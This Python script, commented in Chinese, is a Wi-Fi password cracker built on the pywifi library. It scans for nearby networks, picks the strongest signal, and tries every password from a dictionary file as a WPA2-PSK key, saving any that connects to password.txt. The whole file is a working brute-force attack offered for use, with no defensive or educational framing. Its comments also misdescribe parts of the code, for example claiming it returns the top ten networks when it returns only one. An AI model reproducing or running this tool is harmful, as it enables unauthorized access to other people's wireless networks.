import time
# 破解wifi库
import pywifi
from pywifi import const


class PoJie(object):

    def __init__(self, path):
        # wifi密码字典文件
        self.file = open(path, 'r', errors='ignore')
        # 抓取网卡接口
        wifi = pywifi.PyWiFi()
        # 抓取第一个网卡
        self.iface = wifi.interfaces()[0]
        # 测试连接时断开所有的链接
        self.iface.disconnect()
        time.sleep(1)
        self.alist = self.initialssidnamelist()
        # 测试是否处于断开状态
        # assert self.iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

    def bies(self):
        # 扫描
        self.iface.scan()
        # 获取扫描结果
        bessis = self.iface.scan_results()
        alist = []
        for data in bessis:
            alist.append((data.ssid, data.signal))
        # 按信号强度排序
        return len(alist), sorted(alist, key=lambda st: st[1], reverse=True)

    def getsignal(self):
        while True:
            # 获取所有的wifi
            n, data = self.bies()
            time.sleep(1)
            if n is not 0:
                # 如果数量不为0，返回前10个信号最好的
                return data[0:1]

    def initialssidnamelist(self):
        ssidlist = self.getsignal()
        namelist = []
        # 获取前10个wifi的名称
        for item in ssidlist:
            print(item[0])
            namelist.append(item[0])
        return namelist

    def readPassword(self, ssidname, myStr):
        # 测试wifi名和密码是否匹配
        bool1 = self.test_connect(myStr, ssidname)
        if len(myStr) < 8:
            return False
        if bool1:
            # 保存密码和wifi名到文件中
            save_password_to_file(myStr, ssidname)
            print('------------------------------------------------密码正确: ' + myStr + '-----' + ssidname)
            return True
        else:
            print('密码错误: ' + myStr + ' ' + ssidname)
            return False

    def test_connect(self, findStr, ssidname):
        """
        测试连接
        :param findStr: 密码
        :param ssidname: wifi名
        """
        # 创建wifi链接文件
        profile = pywifi.Profile()
        #  wifi名称
        profile.ssid = ssidname
        # 开放网卡
        profile.auth = const.AUTH_ALG_OPEN
        # wifi加密算法
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        # 加密单元
        profile.cipher = const.CIPHER_TYPE_CCMP
        # 密码
        profile.key = findStr
        # 删除所有的wifi文件
        self.iface.remove_all_network_profiles()
        # 设置新的链接文件
        tmp_profile = self.iface.add_network_profile(profile)
        # 连接
        self.iface.connect(tmp_profile)
        time.sleep(2)
        # 判断是否已经连接上
        if self.iface.status() == const.IFACE_CONNECTED:
            isOk = True
        else:
            isOk = False
        self.iface.disconnect()
        time.sleep(1)
        # 检查断开状态
        assert self.iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

        return isOk

    def run(self):
        while True:
            myStr = self.file.readline()
            for ssidname in self.alist:
                ret = self.readPassword(ssidname, myStr)
                if ret:
                    raise FileExistsError

    def __del__(self):
        self.file.close()


def save_password_to_file(myStr, ssidname):
    with open('password.txt', 'a') as fp:
        fp.write(str(myStr) + '-->' + str(ssidname))


if __name__ == '__main__':
    # 密码字典文件所在路径
    path = 'D:\WIFI密码字典.txt'#此处是wifi密码字典文件的位置
    start = PoJie(path)
    start.run()